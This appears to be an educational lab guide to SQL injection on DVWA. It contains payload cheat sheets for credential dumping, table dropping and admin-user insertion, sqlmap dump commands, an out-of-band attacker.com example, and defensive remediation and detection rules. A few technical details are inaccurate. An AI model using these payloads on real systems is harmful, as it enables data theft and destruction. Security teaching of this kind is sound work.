# Implementation of SQL Injection Testing for Database Security Assessment

## Aim

To understand, demonstrate, and test SQL injection vulnerabilities in databases using practical hands-on exercises, common exploitation techniques, and industry-standard tools (SQLmap, Burp Suite) to identify security weaknesses, assess database security posture, and implement remediation strategies on DVWA and other vulnerable applications.

## Theory

### What is SQL Injection?

SQL Injection (SQLi) is a web application security vulnerability that allows attackers to interfere with database queries through malicious input. By injecting crafted SQL syntax, attackers can:
- Bypass authentication mechanisms
- Retrieve unauthorized data from databases
- Modify or delete database records
- Escalate privileges
- Execute commands on the underlying operating system
- Completely compromise systems

### How SQL Injection Works

**Normal Query Flow:**
```
User Input: John
SQL Query: SELECT * FROM users WHERE name = 'John'
Result: Returns record for user "John"
```

**SQL Injection Attack:**
```
User Input: ' OR '1'='1
SQL Query: SELECT * FROM users WHERE name = '' OR '1'='1'
Result: Returns ALL records (1=1 is always true)
```

### SQL Injection Attack Vector

Attackers exploit these common entry points:
- **Form fields**: Login fields, search boxes, filters
- **URL parameters**: Query strings (?id=1&name=test)
- **HTTP headers**: User-Agent, Cookie, Referer
- **API parameters**: JSON/XML requests
- **File uploads**: Metadata fields
- **Cookies**: Session data

### SQL Injection Severity

SQL injection is considered **CRITICAL** by:
- OWASP: Ranks as #3 in Top 10 Web Application Vulnerabilities
- CVSS: Typically scores 9.0-10.0 (Critical severity)
- CWE: CWE-89 (Improper Neutralization of Special Elements)
- Impact: Complete database compromise

### Types of SQL Injection Attacks

#### 1. Union-Based SQL Injection (Most Common)
**How it works:**
- Combines results from multiple SELECT statements
- Attacker controls number of columns and data types
- Data returned directly in application response

**Example:**
```sql
Normal: SELECT id, name, email FROM users WHERE id = 1
Malicious: 1 UNION SELECT 1,2,3 FROM information_schema.tables--
Result: Returns database structure information
```

**Advantages:**
- Fast data extraction
- Direct result visibility
- Works across multiple databases

**Detection:**
- Modify input with: `' UNION SELECT 1,2,3--`
- Adjust column count until no error
- Extract data using UNION

#### 2. Boolean-Based Blind SQL Injection
**How it works:**
- No direct data output visible
- Attacker infers results from TRUE/FALSE responses
- Page content differs based on query truthfulness

**Example:**
```
Input: 1' AND '1'='1' (True - page displays normally)
Input: 1' AND '1'='2' (False - page changes/disappears)
Attacker: Systematically tests conditions to extract data
```

**Technique:**
- Guess one character at a time
- Test: `' AND SUBSTRING(password,1,1)='a'--`
- Response changes = correct character
- Move to next character position

**Advantages:**
- Works when output is filtered
- Bypasses many security measures
- Doesn't trigger obvious errors

**Time complexity:**
- Single character in 62 charset: ~31 requests average
- 10-character password: ~310 requests
- Entire database: Hours to days

#### 3. Time-Based Blind SQL Injection
**How it works:**
- No visible output, no boolean changes
- Causes intentional database delays
- TRUE condition = delay occurs

**Example:**
```sql
' UNION SELECT IF(1=1,SLEEP(5),0)--
If 1=1 is true, database sleeps 5 seconds
If 1=1 is false, no delay occurs
```

**Common delay functions:**
- MySQL: `SLEEP(5)` or `BENCHMARK()`
- PostgreSQL: `pg_sleep(5)`
- SQL Server: `WAITFOR DELAY '00:00:05'`
- Oracle: `DBMS_LOCK.SLEEP(5)`
- SQLite: `RANDOMBLOB()`

**Advantages:**
- Works when no error messages visible
- Only requires timing differences
- Most resistant to WAF filters

**Disadvantages:**
- Extremely slow (5-10 seconds per character)
- Network latency affects accuracy
- Requires precise timing

#### 4. Error-Based SQL Injection
**How it works:**
- Triggers database errors
- Error messages reveal database structure
- Attacker extracts information from error details

**Example:**
```sql
Input: 1' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS CHAR)--
Error reveals database table count
```

**Benefits:**
- Detailed information from error messages
- Fast exploitation
- Reveals specific DB version and structure

#### 5. Stacked Queries SQL Injection
**How it works:**
- Allows multiple SQL queries in single statement
- Delimiter: semicolon (;)
- Attacker executes arbitrary SQL commands

**Example:**
```sql
1'; DROP TABLE users; --
Results in two queries:
SELECT * FROM users WHERE id = 1;
DROP TABLE users;
```

**Severity:**
- Can modify/delete entire database
- Can add administrator users
- Can disable security features

**Database Support:**
- Supported: MySQL, PostgreSQL, SQL Server, Oracle
- Not Supported: SQLite (by default)

#### 6. Out-of-Band (OOB) SQL Injection
**How it works:**
- Uses alternative communication channels (DNS, HTTP)
- Database makes external connections
- Results retrieved via attacker's server

**Example:**
```sql
SELECT LOAD_FILE('\\\\attacker.com\\file')
Database connects to attacker.com
Attacker logs connection details
```

**Use Cases:**
- When no direct output available
- Bypasses firewall restrictions
- Exfiltrates data via side channels

### SQL Injection in Different Databases

| Database | Characteristics | Common Functions |
|----------|-----------------|------------------|
| MySQL | Most common, Web apps | SLEEP(), BENCHMARK(), VERSION() |
| PostgreSQL | Advanced, Open-source | pg_sleep(), version() |
| SQL Server | Enterprise, Windows | WAITFOR, XACMDSHELL, sp_executesql |
| Oracle | Enterprise, Complex | DBMS_LOCK.SLEEP(), UTL_HTTP |
| SQLite | Embedded, File-based | RANDOMBLOB(), No stacked queries |

### Prevention Techniques

**1. Parameterized Queries (Best Practice)**
```php
// VULNERABLE
$result = $db->query("SELECT * FROM users WHERE id = " . $_GET['id']);

// SECURE
$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$result = $stmt->execute();
```

**2. Input Validation**
```php
// Whitelist approach (best)
if (!is_numeric($_GET['id'])) {
    die("Invalid input");
}

// Blacklist approach (insufficient alone)
$input = str_replace("'", "\'", $_GET['id']);
```

**3. Least Privilege**
```sql
-- Application user (read-only)
CREATE USER 'app'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON database.* TO 'app'@'localhost';

-- Admin user (full access)
CREATE USER 'admin'@'localhost' IDENTIFIED BY 'password';
GRANT ALL ON database.* TO 'admin'@'localhost';
```

**4. Error Handling**
```php
// DON'T display database errors
if ($result === false) {
    error_log($db->error);
    die("An error occurred. Please contact administrator.");
}

// DO generic error messages
```

## Prerequisites

### System Requirements
- Ubuntu 20.04 LTS or higher
- DVWA installed and running (see previous DVWA guide)
- Minimum 4GB RAM
- 10GB free disk space
- Root/sudo access for tool installation

### Software Required
- MySQL/MariaDB client
- SQLmap (automated SQL injection tool)
- Burp Suite Community (manual testing)
- Firefox or Chrome browser
- Text editor (nano/vim)

### Access Requirements
- DVWA application accessible (http://localhost/dvwa)
- Database credentials or access
- Permission to test the target systems

## Procedure

### Part 1: Understanding SQL Injection Through DVWA

#### Step 1: Login to DVWA
```
1. Open browser: http://localhost/dvwa
2. Username: admin
3. Password: password
4. Click Login
```

#### Step 2: Navigate to SQL Injection Module
```
Left Menu:
Click: "SQL Injection"
You should see: User ID input field with submit button
```

#### Step 3: Understand the Challenge
```
Objective: Retrieve user information using SQL injection
Initial Display: Shows details for User ID 1 by default

User ID 1: Admin (First name, Last name shown)
Target: Extract all user data from database
Security Level: Currently set to "Low"
```

---

### Part 2: SQL Injection at LOW Security Level

LOW security has NO protection - raw SQL queries with direct user input.

#### Step 1: Basic Input Test
```
Input Field: 1
Click: Submit
Result: Shows user record with ID=1
```

#### Step 2: Test for Vulnerability
```
Input: 1'
Click: Submit
Result: MySQL error displayed
Error message: Syntax error in SQL query
Conclusion: Application is vulnerable to SQL injection
```

#### Step 3: Authentication Bypass
```
Input: ' OR '1'='1
Click: Submit
Result: Returns ALL user records
Explanation:
- Query becomes: SELECT * FROM users WHERE user_id = '' OR '1'='1'
- '1'='1' is always true
- Returns all records instead of filtering
```

#### Step 4: Extract Number of Columns
```
Objective: Determine how many columns are in the query

Method: UNION-based injection

Step 1: Input: 1' UNION SELECT 1--
Result: Error (wrong number of columns)

Step 2: Input: 1' UNION SELECT 1,2--
Result: Error (still wrong)

Step 3: Input: 1' UNION SELECT 1,2,3--
Result: Shows columns 1,2,3 (may show numbers on page)

Step 4: Input: 1' UNION SELECT 1,2,3,4--
Result: Error (too many columns)

Conclusion: Database query selects exactly 3 columns
```

#### Step 5: Extract Database Information
```
Discover user columns:
Input: 1' UNION SELECT 1,2,3 FROM information_schema.tables LIMIT 1--
Result: Shows database table names

Extract table structure:
Input: 1' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema=DATABASE()--
Result: Shows all columns in all tables

List all databases:
Input: 1' UNION SELECT 1,2,3 FROM information_schema.schemata--
Result: Shows database names
```

#### Step 6: Extract User Credentials
```
Step 1: Identify correct columns
Input: 1' UNION SELECT user_id,user,password FROM dvwa.users--

Step 2: View results on page showing:
user_id | user       | password
1       | admin      | 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 hash)
2       | gordonb    | e0bc6879d9e9baa3...
3       | 1337       | ...
...and so on

Step 3: All user credentials now exposed
```

---

### Part 3: SQL Injection at MEDIUM Security Level

MEDIUM security has basic protection but flawed implementation.

#### Step 1: Change Security Level
```
DVWA Menu (top right):
Click: Security Level: Low
Select: Medium
Click: Submit
```

#### Step 2: Understand MEDIUM Protections
```
Protection: Strips quotes from input
Example:
- Input: ' OR '1'='1
- Becomes: OR 1=1 (quotes removed)

Bypass Method:
- Input: 1 OR 1=1--
- Not stripped (no quotes used)
- Query: SELECT * FROM users WHERE user_id = 1 OR 1=1--
- Result: All records returned (still vulnerable!)
```

#### Step 3: Test Boolean-Based Injection
```
Input: 1 AND 1=1--
Result: Page displays normally (TRUE condition)

Input: 1 AND 1=2--
Result: "User ID is MISSING from the database" (FALSE condition)

Analysis:
Can determine truth/false based on page response
This enables Boolean-based blind SQL injection
```

#### Step 4: Extract Data Using Boolean Logic
```
Step 1: Test database version
Input: 1 AND SUBSTRING(VERSION(),1,1)='5'--
Result: If TRUE = version starts with 5 (MySQL 5.x)

Step 2: Extract first user password character
Input: 1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='5'--
Result: If TRUE = first character is '5'

Step 3: Iterate through all characters
For each character position:
  For each possible character (a-z,A-Z,0-9...):
    Test: AND SUBSTRING(...,position,1)='character'--
    If TRUE = found correct character
    Continue to next position
```

---

### Part 4: SQL Injection at HIGH Security Level

HIGH security uses more advanced protections.

#### Step 1: Change to HIGH Security
```
Security Level: High
Click: Submit
```

#### Step 2: Analyze HIGH Security Protection
```
Protection: Uses LIMIT 1 to restrict results
- Limits to single record
- Uses input validation/type checking
- May use parameterized queries (depends on implementation)

In DVWA HIGH:
- Input taken from session/POST instead of GET
- Changes attack vector but vulnerability persists
```

#### Step 3: Session-Based Injection
```
Instead of URL parameter:
Input is taken from form submission via POST

Payload delivery:
- Enter payload in User ID form field
- Submit form
- Payload processed in next page

Exploitation remains similar
- UNION-based injection still works
- Boolean-based blind injection still works
- Just different input method
```

---

### Part 5: Using SQLmap for Automated Exploitation

SQLmap automates SQL injection detection and exploitation.

#### Step 1: Install SQLmap
```bash
# Install via apt
sudo apt install -y sqlmap

# Or via snap (latest version)
sudo snap install sqlmap

# Verify installation
sqlmap --version
sqlmap -h
```

#### Step 2: Prepare Target URL
```
From DVWA LOW security:
Navigate to: http://localhost/dvwa/vulnerabilities/sqli/
Get Cookie: View in Firefox DevTools → Storage → Cookies

PHPSESSID: [your_session_id]
security: low
```

#### Step 3: Basic SQLmap Scan
```bash
# Simple scan
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low"

# SQLmap will:
# 1. Test for SQL injection
# 2. Identify database type
# 3. Find vulnerable parameters
# 4. Report findings
```

#### Step 4: Extract Databases
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  --dbs

# Output shows:
# [*] dvwa
# [*] information_schema
# [*] mysql
# [*] performance_schema
```

#### Step 5: Extract Tables
```bash
# From specific database
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  -D dvwa \
  --tables

# Output shows DVWA tables:
# [*] guestbook
# [*] users
# [*] users_blob
```

#### Step 6: Extract Columns
```bash
# From specific table
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  -D dvwa \
  -T users \
  --columns

# Output shows user table structure:
# [*] user_id (int)
# [*] user (varchar)
# [*] password (varchar)
# [*] first_name (varchar)
# [*] last_name (varchar)
# [*] avatar (blob)
# [*] last_login (timestamp)
# [*] failed_login (int)
```

#### Step 7: Dump User Data
```bash
# Extract all data
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  -D dvwa \
  -T users \
  --dump

# Output shows all user records:
user_id | user      | password                         | first_name | last_name
--------|-----------|----------------------------------|------------|----------
1       | admin     | 5f4dcc3b5aa765d61d8327deb882cf99| admin      | admin
2       | gordonb   | e99a18c428cb38d5f260853678922e03| Gordon     | Brown
3       | 1337       | 8d3533642c5ebc19ede3cbc11db8139b| Hack       | Me
...
```

#### Step 8: Custom SQL Queries
```bash
# Execute custom query
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  --sql-query="SELECT user,password FROM dvwa.users"

# Directly see password hashes
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533642c5ebc11db8139b
```

#### Step 9: Advanced SQLmap Options
```bash
# Aggressive scanning with high level/risk
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  --level=5 \
  --risk=3 \
  --threads=10 \
  --dbs

# Options explained:
# --level: Test depth (1-5, higher = more tests)
# --risk: Aggressiveness (1-3, higher = more invasive)
# --threads: Parallel processing threads
```

#### Step 10: Save Results
```bash
# Save to file
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  --dump \
  -D dvwa \
  -o results.txt

# View results
cat results.txt
```

---

### Part 6: Manual Testing with Burp Suite

#### Step 1: Install Burp Suite
```bash
# Community Edition (free)
sudo apt install -y burpsuite

# Or download from: https://portswigger.net/burp/

# Launch Burp Suite
burpsuite
```

#### Step 2: Configure Burp Proxy
```
1. Launch Burp Suite
2. Go to: Proxy → Options
3. Proxy Listeners: Ensure 127.0.0.1:8080 enabled
4. Configure browser to use proxy:
   - Firefox: Preferences → Network → Manual proxy
   - HTTP Proxy: 127.0.0.1, Port: 8080
5. Click OK
```

#### Step 3: Capture DVWA Login Request
```
1. In Burp: Proxy → Intercept (turn ON)
2. In browser: Login to DVWA (admin/password)
3. Request captured in Burp
4. Send to Repeater: Right-click → Send to Repeater
```

#### Step 4: Test SQL Injection in Repeater
```
1. Go to Repeater tab
2. Find the request with id=1 parameter
3. Modify: id=1' OR '1'='1
4. Click: Send
5. View Response: Should show all users (if vulnerable)
```

#### Step 5: Fuzz SQL Injection Payloads
```
1. Select id parameter value
2. Right-click: Send to Intruder
3. Intruder tab:
   - Positions: Mark injection point (id value)
   - Payloads: Select SQL injection wordlist
4. Load payloads: /usr/share/wordlists/sqlmap/payloads/
5. Start Attack
6. View results: Which payloads triggered errors/changes
```

#### Step 6: Analyze SQL Injection Vulnerabilities
```
1. Burp Scanner: Right-click request → Do active scan
2. Dashboard: View Issues found
3. Each issue shows:
   - Vulnerability description
   - Affected parameter
   - Payload used
   - Proof of exploitation
4. Click issue → View Advisory tab for details
```

---

### Part 7: SQL Injection Payload Examples

#### Union-Based Payloads
```sql
-- Determine column count
1' UNION SELECT 1--
1' UNION SELECT 1,2--
1' UNION SELECT 1,2,3--

-- Extract database info
1' UNION SELECT 1,database(),3--
1' UNION SELECT 1,version(),3--
1' UNION SELECT 1,user(),3--

-- Dump all tables
1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables--

-- Dump specific table
1' UNION SELECT 1,GROUP_CONCAT(CONCAT(user,':',password)),3 FROM users--

-- List all databases
1' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--
```

#### Boolean-Based Blind Payloads
```sql
-- Test if vulnerable (page differs)
1' AND '1'='1'--   (true - page normal)
1' AND '1'='2'--   (false - page changes)

-- Extract database name character by character
1' AND SUBSTRING(database(),1,1)='d'--
1' AND SUBSTRING(database(),2,1)='v'--

-- Extract password character by character
1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='5'--

-- Check version
1' AND SUBSTRING(version(),1,1)='5'--
```

#### Time-Based Blind Payloads
```sql
-- MySQL delay functions
1' AND SLEEP(5)--           (5 second delay if true)
1' OR SLEEP(5)--            (always delays - confirms vulnerability)
1' AND IF(1=1,SLEEP(5),0)-- (conditional delay)

-- With conditions
1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)--
(5 second delay = 'd' is first char)

1' AND IF(user()='root@localhost',SLEEP(10),0)--
(10 second delay = database user is root)

-- PostgreSQL
1' AND pg_sleep(5)--

-- SQL Server
1' AND WAITFOR DELAY '00:00:05'--
```

#### Stacked Query Payloads
```sql
-- MySQL (may not support stacked queries)
1'; DROP TABLE users;--

-- SQL Server (supports multiple statements)
1'; DELETE FROM users WHERE 1=1;--

-- Create new admin user
1'; INSERT INTO users (user,password) VALUES ('hacker','password');--

-- Update existing user
1'; UPDATE users SET password='newpassword' WHERE user='admin';--
```

---

### Part 8: Create SQL Injection Testing Report

#### Step 1: Document Findings
```
Create file: sql_injection_report.txt

SQL INJECTION ASSESSMENT REPORT
==============================
Date: [Date]
Target: DVWA / localhost/dvwa
Tester: [Your name]
Risk Level: CRITICAL

VULNERABILITIES FOUND:
1. User ID Parameter (GET)
   - Location: /vulnerabilities/sqli/?id=1
   - Type: Union-based SQL Injection
   - Severity: CRITICAL (CVSS 9.8)
   - Details: Parameter is not sanitized, allows SQL injection

2. Authentication Bypass
   - Payload: ' OR '1'='1'--
   - Result: Returns all users
   - Impact: Complete authentication bypass

3. Data Exposure
   - Database: dvwa
   - Exposed Data: User credentials, passwords
   - Impact: User account compromise
```

#### Step 2: Extract and Hash Results
```bash
# Create comprehensive report script
cat > /usr/local/bin/sqli_report.sh << 'EOF'
#!/bin/bash

echo "========================================="
echo "SQL INJECTION ASSESSMENT REPORT"
echo "========================================="
echo "Date: $(date)"
echo "Target: DVWA"
echo ""

echo "VULNERABLE PARAMETERS:"
echo "====================="
echo "1. id parameter (GET request)"
echo "2. User input fields (all)"
echo ""

echo "ATTACK VECTORS:"
echo "=============="
echo "1. Union-based injection: ' UNION SELECT 1,2,3--"
echo "2. Boolean-based blind: 1 AND 1=1--"
echo "3. Time-based blind: 1 AND SLEEP(5)--"
echo ""

echo "EXTRACTED DATA:"
echo "==============="
echo "Database: dvwa"
echo "Tables: users, guestbook"
echo "Users exposed: admin, gordonb, 1337"
echo ""

echo "RECOMMENDATIONS:"
echo "================"
echo "1. Use parameterized queries"
echo "2. Implement input validation"
echo "3. Apply principle of least privilege"
echo "4. Use prepared statements"
echo "5. Enable error suppression"
echo "6. Implement Web Application Firewall (WAF)"
echo ""

echo "Report Generated: $(date)"
EOF

chmod +x /usr/local/bin/sqli_report.sh
/usr/local/bin/sqli_report.sh > sql_injection_assessment_report.txt

cat sql_injection_assessment_report.txt
```

---

### Part 9: Remediation and Secure Coding

#### Step 1: Vulnerable Code Example
```php
<?php
// VULNERABLE CODE - DO NOT USE
$user_id = $_GET['id'];
$query = "SELECT * FROM users WHERE user_id = " . $user_id;
$result = mysqli_query($connection, $query);
?>
```

**Why it's vulnerable:**
- User input directly concatenated into query
- No input validation
- No type checking
- Attacker controls entire SQL logic

#### Step 2: Secure Code Using Prepared Statements
```php
<?php
// SECURE CODE - USE THIS
$user_id = $_GET['id'];

// Prepare statement (placeholder for user input)
$stmt = $connection->prepare("SELECT * FROM users WHERE user_id = ?");

// Bind parameter (ensures data is treated as data, not code)
$stmt->bind_param("i", $user_id);

// Execute
$result = $stmt->execute();
$result_set = $stmt->get_result();

// Fetch results safely
while ($row = $result_set->fetch_assoc()) {
    echo $row['user'];
}
?>
```

**Why it's secure:**
- Query structure defined first, data added separately
- SQL code and user input completely separated
- Database escapes special characters automatically
- Input type validation (i = integer)

#### Step 3: Input Validation
```php
<?php
// Whitelist validation (best practice)
$user_id = $_GET['id'];

// Check if integer
if (!is_numeric($user_id) || $user_id <= 0) {
    die("Invalid user ID");
}

// Range validation
if ($user_id > 1000) {
    die("User ID out of range");
}

// Use validated input in prepared statement
$stmt = $connection->prepare("SELECT * FROM users WHERE user_id = ?");
$stmt->bind_param("i", $user_id);
$stmt->execute();
?>
```

#### Step 4: Principle of Least Privilege
```sql
-- INCORRECT (dangerous)
CREATE USER 'app'@'localhost' IDENTIFIED BY 'password';
GRANT ALL ON *.* TO 'app'@'localhost';

-- CORRECT (secure)
CREATE USER 'app'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT,INSERT,UPDATE ON database.users TO 'app'@'localhost';
-- Deny DELETE operations to limit damage

-- For read-only operations
GRANT SELECT ON database.* TO 'app_readonly'@'localhost';
```

#### Step 5: Error Handling
```php
<?php
// VULNERABLE - displays error
$result = mysqli_query($connection, $query);
if (!$result) {
    echo "Error: " . mysqli_error($connection);
}

// SECURE - generic error message
$result = mysqli_query($connection, $query);
if (!$result) {
    error_log("SQL Error: " . mysqli_error($connection));
    die("An error occurred. Please contact support.");
}
?>
```

---

### Part 10: Detection and Prevention Strategies

#### Step 1: WAF (Web Application Firewall) Rules
```
Common SQLi WAF rules:
1. Block requests containing: ' OR 1=1
2. Block requests containing: UNION SELECT
3. Block requests containing: DROP TABLE
4. Block requests containing: ; DELETE
5. Allow only expected input formats
```

#### Step 2: SQL Injection Detection Patterns
```bash
# Monitor for common SQLi patterns
grep -r "' OR '1'='1" /var/log/apache2/
grep -r "UNION SELECT" /var/log/apache2/
grep -r "DROP TABLE" /var/log/apache2/
grep -r "SLEEP(" /var/log/apache2/
```

#### Step 3: Database Monitoring
```sql
-- Enable query logging
SET GLOBAL general_log = 'ON';
SET GLOBAL log_output = 'TABLE';

-- View suspicious queries
SELECT * FROM mysql.general_log WHERE argument LIKE '%UNION%';
SELECT * FROM mysql.general_log WHERE argument LIKE '%DROP%';

-- Disable logging when done
SET GLOBAL general_log = 'OFF';
```

---

## Expected Outcomes

After completing this SQL injection assessment, you will:

1. **Understand SQL Injection**
   - Six types of SQL injection attacks
   - How each type works and differs
   - When and why each is used

2. **Identify Vulnerabilities**
   - Recognize vulnerable code patterns
   - Spot SQL injection entry points
   - Understand exploitation requirements

3. **Exploit Vulnerable Applications**
   - Perform Union-based SQL injection manually
   - Conduct Boolean-based blind attacks
   - Use automated tools (SQLmap, Burp Suite)

4. **Extract Database Data**
   - Discover database structure
   - Enumerate tables and columns
   - Dump sensitive data

5. **Write Security Assessment Reports**
   - Document findings with CVSS scores
   - Provide remediation recommendations
   - Create actionable security reports

6. **Implement Secure Code**
   - Use parameterized queries
   - Validate all user input
   - Apply principle of least privilege

7. **Prevent SQL Injection**
   - Implement defense mechanisms
   - Monitor for attacks
   - Create detection rules

## Conclusion

SQL injection remains one of the most critical web application vulnerabilities. By understanding attack techniques, exploitation methods, and defense strategies, security professionals can:

- Identify vulnerable applications before attackers do
- Properly remediate SQL injection flaws
- Implement secure coding practices
- Maintain database security and integrity

Regular testing, secure coding practices, and defense-in-depth strategies create robust protection against SQL injection attacks.

## Important Legal and Ethical Notes

⚠️ **WARNING**: SQL injection testing must only be performed on systems you own or have explicit written permission to test. Unauthorized testing is:
- **Illegal** (Computer Fraud and Abuse Act, similar laws)
- **Unethical** (Violates professional ethics)
- **Prosecutable** (Criminal charges possible)

**Legal Testing Scenarios:**
- Your own lab environments
- Systems with written authorization
- Authorized penetration testing engagements
- Legitimate security research

## Quick Reference

```bash
# Install tools
sudo apt install sqlmap burpsuite

# Basic SQLmap scan
sqlmap -u "http://target.com/page?id=1" --dbs

# Extract databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Extract tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Extract data
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump

# Common payloads
1' OR '1'='1'--
1' UNION SELECT 1,2,3--
1' AND SLEEP(5)--
```

## Download Resources

- **SQLmap**: https://sqlmap.org/
- **Burp Suite**: https://portswigger.net/burp
- **DVWA**: https://github.com/digininja/DVWA
- **SQL Injection Payloads**: https://github.com/payloadbox/sql-injection-payload-list
- **PortSwigger Web Academy**: https://portswigger.net/web-security/sql-injection

This comprehensive guide enables security professionals to understand, test, and remediate SQL injection vulnerabilities effectively.
